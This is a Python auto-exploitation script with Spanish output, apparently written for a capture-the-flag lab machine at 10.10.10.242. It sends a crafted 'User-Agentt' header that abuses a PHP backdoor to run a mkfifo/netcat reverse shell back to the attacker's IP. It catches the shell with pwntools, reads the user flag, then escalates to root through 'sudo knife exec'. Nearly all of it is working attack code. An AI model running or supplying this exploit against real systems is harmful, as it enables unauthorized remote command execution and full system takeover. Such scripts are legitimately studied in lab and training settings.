#!/usr/bin/python3

import requests
import sys 
import signal
import time 
import threading
from pwn import *

def print_banner():
    banner = """
    
                            ..',;:clllllllcc;,'..                           
                      ..,;clodxxxxxxxxxxxxxxxdolc:,..                      
                  .';coxxxxxxxxxxxxxxxxxxxxxxxxxxxxxol;'.                  
               .,coxxxxxxxxdolcc:;;;;;;;;;:cclodxxxxxxxxoc,.               
             ':oxxxxxxdoc;,..............   ....';codxxxxxxoc'             
          .,ldxxxxxdl;'..   ................       ..;cdxxxxxxl,.          
         'lxxxxxdl;..   .......................        .,ldxxxxxl,.        
       .cdxxxxdc'.   ........';::cccccccc::;,....        .'cdxxxxxc.       
      ,oxxxxdc'.   .......,:ldxxxxxxxdolllloolc:'..         .cdxxxxo;.     
    .:dxxxxo,.   .......;lxkxkkkOkkOkdollllllllool,.         .,oxxxxd:.    
   .cxxxxxc.   .......,oxkkkkkkkOOOOkxollllllllllodl'.         .cxxxxxc.   
  .cxxxxd:.  ........:xkkkkkkkdl:;,,,''..',;:lllooodd;.         .:dxxxxc.  
  :xxxxx:.  ........;xOkkkkxc'.              .,cooooxx;..        .:dxxxx:. 
 'dxxxxl.  ........,dOkkkkl.                   .;lodoxd.          .cxxxxd, 
.cxxxxo'   ........:kOkkk:                       ,oddxx;.. ...     .oxxxxl.
'dxxxx:.  ..,;;,...lOkkOo. .,;;,.         .'''....cddxOc.....       :xxxxd,
:xxxxd,   .cc;;:::;lkkkOl..:c;co:         .,:l;  .cOO00o','.        'oxxxx:
cxxxxo'..,c:''''','',,,,;;;c;',c,          ....   cKNNN0l,....      .lxxxxl
lxxxxl::c:;,'','.','.',;;:l:,,:lldxxxxxxxxxxxxxxkkKWWWMW0xc'.       .cxxxxo
lxxxxl;;,',,'';:;lollclxd:,,,:cco0XXXXXXXXXXXNNNNWWWWWWWWWN0xl,.    .cxxxxo
cxxxxo;,,,;:clxkkkOOkdlod:,,,;::lkOOOOOOOOOOOO000KKKKKKXXXXNNWXOd,  .lxxxxl
:xxxxd;',lOOkOOOkkkkkkdlooc;,;;:dOOOOOOOOOOOOOOOOOOOOOOO0O000KKK0k; 'okxxx:
'dxxxx:. .cO0OkkkkkkkkkdlxOc'',c;,;;;;;:::clodxkkkkkkkOd::;,'''... .:xxxxd,
.cxxxxo'   'xK0Okkkkkkkkolxxlldxolc:;,,,,;;:cclloooddxOl....       .oxxxxl.
 'dxxxxc'',;ckKKOkkkkkkkdld00OOOOkkkkxoooodddxxxxkkkOOOkxdolc:;,'..cxxxxd, 
  :xxxxxl:cloox0K0Okkkkxllx000000000OOkkkOOOOOkkkkxxxxxdddooollcc:cdxxxx:. 
  .cxxxxdc:cllldkxolc::;;;:oO0O00000OOkkkkkkkxxxddddddddooollcc:;cdxxxxc.  
   .cxxxxxl::ccdo,''''''.;dkOOOOOOO0OOkxxxxxddddddddddooollcc::;lxxxxxc.   
    .:dxxxxoc::ldc''''''.:kOkkkkkkOOOkxxdddddddddddooolllcc::;:oxxxxxc.    
      ,oxxxxdl::oc',,,,'.:kkkkkkkkkkkxxdddddddoooooolllcc::;:ldxxxxd;.     
       .cdxxxxdll;,,,,,,.cxxxxxxxxxxxxdoooooooollllcccc:;;:ldxxxxxc.       
         ,lxxxxxdl:;,,,'.cxooddddddddoolllllllccllc:,'',:ldxxxxxl,.        
          .,lxxxxxxdl:;'.:ccllloooooollcccccc:c:,....;cdxxxxxxl,.          
             ':oxxxxxxdoll;,:::cccccc::;;;;;;;:,';codxxxxxxoc'.            
               .,coxxxxxxxxdoollllccccccccclloodxxxxxxxxoc,.               
                  .';lodxxxxxxxxxxxxxxxxxxxxxxxxxxxxol;'.                  
                      ..,:clodxxxxxxxxxxxxxxxdolc:,..                      
                           ..',:ccllooollcc:,'..
    """
    print(banner)

def def_handler(sig, frame):
    print("\n\n[+] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    print_banner()

    if len(sys.argv) < 2:
        print(f"\n\033[1;37m[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <TuIP>\n")
        sys.exit(1)

    def autopwn():
        target = "http://10.10.10.242/"
        p1 = log.progress("Inyectando comando desde el User-Agent")
        headers = {"User-Agentt": f"zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {sys.argv[1]} 443 >/tmp/f');"}
        requests.get(target, headers=headers)
        p1.success("Listo")

    bar = log.progress("Ganando acceso al sistema")
    threading.Thread(target=autopwn, args=()).start()
    shell = listen(443, timeout=10).wait_for_connection()
    bar.success("User.txt")
    time.sleep(5)
    shell.sendline(b"cd; cat user.txt")
    p3 = log.progress("Elevando privilegios")
    time.sleep(5)
    shell.sendline(b"sudo knife exec -E 'exec \"/bin/sh\"'")
    p3.success("root.txt")
    shell.sendline(b"cd; cat root.txt")
    shell.interactive()

